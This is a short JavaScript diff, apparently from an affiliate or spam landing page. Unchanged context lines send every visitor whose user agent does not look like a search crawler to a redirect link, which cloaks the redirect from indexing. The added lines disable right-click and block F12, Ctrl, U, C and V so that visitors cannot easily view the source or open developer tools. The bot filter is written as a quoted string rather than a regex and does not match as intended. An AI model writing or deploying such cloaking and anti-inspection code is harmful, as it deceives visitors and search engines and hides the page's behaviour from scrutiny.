@@ -14,7 +14,7 @@ if (document.getElementById("affiliateLink")) {
 }
 
 let user_agent = navigator.userAgent,
-	filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i',
+	filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i';
 if (!user_agent.match(filter_bot)){
   window.location.replace(redirect_link);
 }
@@ -33,5 +33,25 @@ function product(data) {
 		content.innerHTML = item.productDesc;
 	} else {
 		content.innerHTML = 'data not found';
+	}
+}
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.onkeypress = function (event) {
+	event = (event || window.event);
+	if (event.keyCode == 123 || event.keyCode == 86 || event.keyCode == 85 || event.keyCode == 67 || event.keyCode === 17){
+		return false;
+	}
+}
+document.onmousedown = function (event) {
+	event = (event || window.event);
+	if (event.keyCode == 123 || event.keyCode == 86 || event.keyCode == 85 || event.keyCode == 67 || event.keyCode === 17) {
+		return false;
+	}
+}
+document.onkeydown = function (event) {
+	event = (event || window.event);
+		if (event.keyCode == 123 || event.keyCode == 86 || event.keyCode == 85 || event.keyCode == 67 || event.keyCode === 17) {
+		return false;
 	}
 }
